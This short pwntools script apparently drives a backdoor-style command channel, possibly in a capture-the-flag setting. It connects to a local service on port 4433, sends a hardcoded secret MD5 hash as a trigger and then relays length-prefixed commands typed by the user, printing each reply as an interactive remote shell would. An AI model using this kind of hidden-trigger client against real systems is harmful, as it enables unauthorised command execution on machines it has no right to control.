from pwn import *

magic_hash = b'e2162a8692df4e158e6fd33d1467dfe0' #md5 of s4v3_th3_w0rld

while True:
    p = remote('localhost', 4433)
    p.send(magic_hash)

    cmd = input("> ")
    cmd = 'command:' + cmd
    size = len(cmd)

    payload = bytes([size])
    payload += cmd.encode('latin-1')

    p.send(payload)
    response = p.recv(timeout=0.5)
    print(response.decode('latin-1'))